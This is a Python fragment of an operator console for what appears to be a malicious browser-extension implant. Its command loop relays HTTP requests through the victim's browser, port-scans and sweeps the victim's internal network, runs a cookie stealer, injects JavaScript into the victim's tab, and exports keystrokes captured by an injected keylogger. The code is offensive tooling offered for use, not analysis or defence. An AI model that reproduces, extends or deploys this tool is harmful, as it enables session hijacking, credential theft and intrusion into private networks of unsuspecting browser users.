# ──────────────────────────────────────────────────────
# AUTOCOMPLETE
# ──────────────────────────────────────────────────────

COMMANDS = [
    'get', 'post', 'postjson', 'head', 'save', 'scan', 'sweep',
    'status', 'preload', 'help', 'exit', 'quit',
    'add_listener', 'listeners', 'rm_listener',
    'cookie_stealer', 'save_cookies',
    'inject_javascript', 'injection_keylogger',
    'url', 'tab_history',
]

# Commands whose argument is a file path
FILE_ARG_COMMANDS = {'save', 'save_cookies', 'inject_javascript'}


def _complete_path(partial):
    """Return filesystem completions for a partial path."""
    import glob
    if not partial:
        partial = './'
    # Expand ~ if present
    expanded = os.path.expanduser(partial)
    # Add wildcard for glob
    matches = glob.glob(expanded + '*')
    results = []
    for m in matches:
        # Re-collapse home dir if user typed ~
        if partial.startswith('~'):
            m = '~' + m[len(os.path.expanduser('~')):]
        # Append / to directories
        if os.path.isdir(os.path.expanduser(m)):
            m += '/'
        results.append(m)
    return results


def _completer(text, state):
    """Readline completer for commands + file paths."""
    line = readline.get_line_buffer().lstrip()

    if ' ' not in line:
        # Completing a command name
        matches = [c + ' ' for c in COMMANDS if c.startswith(text)]
    else:
        # Completing an argument — check if the command takes a file path
        cmd = line.split()[0].lower()
        if cmd in FILE_ARG_COMMANDS:
            matches = _complete_path(text)
        else:
            # No special completion for other args
            matches = []

    if state < len(matches):
        return matches[state]
    return None


def setup_autocomplete():
    """Configure readline with tab completion."""
    readline.set_completer(_completer)
    readline.set_completer_delims(' \t')
    # macOS uses libedit which needs a different parse_and_bind
    if 'libedit' in readline.__doc__:
        readline.parse_and_bind('bind ^I rl_complete')
    else:
        readline.parse_and_bind('tab: complete')


def handler_loop():
    last_body = None
    last_cookies = None
    last_keylog = None
    setup_autocomplete()
    print_help()

    while True:
        try:
            drain_output()
            # Show current victim URL above prompt
            with LOCK:
                cur = ACTIVE_TAB['url']
            if cur:
                # Truncate for prompt display
                disp = cur if len(cur) <= 70 else cur[:67] + '...'
                sys.stdout.write(f"  {CYAN}@ {disp}{RESET}\n")
            cmd = input(f"{BOLD}{RED}proxy>{RESET} ").strip()
            drain_output()
        except (EOFError, KeyboardInterrupt):
            print(f"\n  {YELLOW}[*] Exiting...{RESET}")
            break

        if not cmd:
            continue

        parts  = cmd.split(None, 2)
        action = parts[0].lower()

        if action in ('exit', 'quit'):
            print(f"  {YELLOW}[*] Exiting...{RESET}")
            break

        elif action == 'help':
            print_help()

        elif action in ('status', 'health'):
            print_status()

        elif action == 'preload' and len(parts) >= 2:
            url    = parts[1]
            method = parts[2] if len(parts) > 2 else 'GET'
            tid, evt = submit_task(url, method)
            print(f"  {GREEN}[+] Task #{tid} pre-queued: {method} {url}{RESET}")
            print(f"  {YELLOW}[*] Will execute when extension connects and polls{RESET}")

            def _wait_preload(tid, evt, url):
                result = wait_result(tid, evt, timeout=120)
                if result:
                    if 'error' in result:
                        bg_print(f"\n  {RED}[!] Preload error for {url}: {result['error']}{RESET}\n")
                    else:
                        status  = result.get('status', '?')
                        b64body = result.get('body', '')
                        try:
                            body_bytes = base64.b64decode(b64body)
                        except Exception:
                            body_bytes = b''
                        bg_print(
                            f"\n  {GREEN}{BOLD}[+] Preload result: {url}{RESET}\n"
                            f"  {GREEN}[{status}]{RESET} {len(body_bytes)} bytes — use 'save <file>' to retrieve\n"
                        )
                        with LOCK:
                            RESULT_STORE[f'preload_{tid}'] = (body_bytes, time.time())

            threading.Thread(target=_wait_preload, args=(tid, evt, url), daemon=True).start()

        elif action == 'get' and len(parts) >= 2:
            result    = do_request(parts[1], 'GET')
            last_body = display_result(result)

        elif action == 'post' and len(parts) >= 3:
            result    = do_request(parts[1], 'POST', body=parts[2])
            last_body = display_result(result)

        elif action == 'postjson' and len(parts) >= 3:
            result    = do_request(parts[1], 'POST', body=parts[2],
                                   headers={'Content-Type': 'application/json'})
            last_body = display_result(result)

        elif action == 'head' and len(parts) >= 2:
            result    = do_request(parts[1], 'HEAD')
            last_body = display_result(result)

        elif action == 'save' and len(parts) >= 2:
            fname = parts[1]
            if last_keylog:
                # Export keylog session
                export = {
                    'session_time': time.strftime('%Y-%m-%d %H:%M:%S'),
                    'total_keystrokes': len(last_keylog['keys']),
                    'keystrokes_raw': last_keylog['keys'],
                    'keystrokes_text': _keylog_to_text(last_keylog['keys']),
                    'events': last_keylog['events'],
                }
                with open(fname, 'w') as f:
                    json.dump(export, f, indent=2)
                print(f"  {GREEN}[+] Saved keylog ({export['total_keystrokes']} keystrokes) to {fname}{RESET}")
                last_keylog = None
            elif last_body:
                with open(fname, 'wb') as f:
                    f.write(last_body)
                print(f"  {GREEN}[+] Saved {len(last_body)} bytes to {fname}{RESET}")
            else:
                saved = False
                with LOCK:
                    for k, v in list(RESULT_STORE.items()):
                        # Fix #1: preloads are now (bytes, timestamp) tuples
                        if isinstance(k, str) and k.startswith('preload_') and isinstance(v, tuple):
                            body_bytes = v[0]
                            with open(fname, 'wb') as f:
                                f.write(body_bytes)
                            print(f"  {GREEN}[+] Saved {len(body_bytes)} bytes (preloaded) to {fname}{RESET}")
                            del RESULT_STORE[k]
                            last_body = body_bytes
                            saved = True
                            break
                if not saved:
                    print(f"  {RED}[!] No data to save{RESET}")

        elif action == 'scan' and len(parts) >= 3:
            base_url = parts[1].rstrip('/')
            ports    = [p.strip() for p in parts[2].split(',')]
            print(f"  {YELLOW}[*] Scanning {len(ports)} ports on {base_url}...{RESET}")
            for p in ports:
                url    = f"{base_url}:{p}/"
                result = do_request(url, 'GET', timeout=10)
                if result and 'error' not in result:
                    status = result.get('status', '?')
                    color  = GREEN if 200 <= status < 300 else YELLOW
                    size   = len(base64.b64decode(result.get('body', '')))
                    print(f"  {color}[OPEN] {url} -> {status} ({size} bytes){RESET}")
                else:
                    err = result.get('error', 'timeout') if result else 'timeout'
                    print(f"  {RED}[CLOSED] {url} ({err}){RESET}")

        elif action == 'sweep' and len(parts) >= 2:
            sweep_parts = parts[1].split() if len(parts) == 2 else parts[1:]
            if len(sweep_parts) >= 3:
                base_ip = sweep_parts[0]
                start   = int(sweep_parts[1])
                end     = int(sweep_parts[2])
                port    = sweep_parts[3] if len(sweep_parts) > 3 else '80'
                print(f"  {YELLOW}[*] Sweeping {base_ip}.{start}-{end} on port {port}...{RESET}")
                for i in range(start, end + 1):
                    url    = f"http://{base_ip}.{i}:{port}/"
                    result = do_request(url, 'GET', timeout=8)
                    if result and 'error' not in result:
                        status = result.get('status', '?')
                        size   = len(base64.b64decode(result.get('body', '')))
                        print(f"  {GREEN}[ALIVE] {base_ip}.{i}:{port} -> {status} ({size} bytes){RESET}")
            else:
                print(f"  {RED}Usage: sweep <cidr_base> <start> <end> [port]{RESET}")

        elif action == 'add_listener' and len(parts) >= 2:
            try:
                add_listener(parts[1])
            except ValueError:
                print(f"  {RED}[!] Invalid port: {parts[1]}{RESET}")

        elif action == 'listeners':
            list_listeners()

        elif action == 'rm_listener' and len(parts) >= 2:
            try:
                rm_listener(parts[1])
            except ValueError:
                print(f"  {RED}[!] Invalid listener ID: {parts[1]}{RESET}")

        elif action == 'cookie_stealer':
            stolen = steal_cookies()
            if stolen:
                last_cookies = stolen

        elif action == 'save_cookies' and len(parts) >= 2:
            if last_cookies:
                save_cookies(last_cookies, parts[1])
            else:
                print(f"  {RED}[!] No cookies to save. Run 'cookie_stealer' first.{RESET}")

        elif action == 'inject_javascript' and len(parts) >= 2:
            inject_javascript(parts[1])

        elif action == 'injection_keylogger':
            kl_keys, kl_events = run_keylogger_display()
            if kl_events:
                last_keylog = {'keys': kl_keys, 'events': kl_events}

        elif action == 'url':
            show_current_url()

        elif action == 'tab_history':
            show_tab_history()

        else:
            print(f"  {RED}[!] Unknown command. Type 'help' for usage.{RESET}")


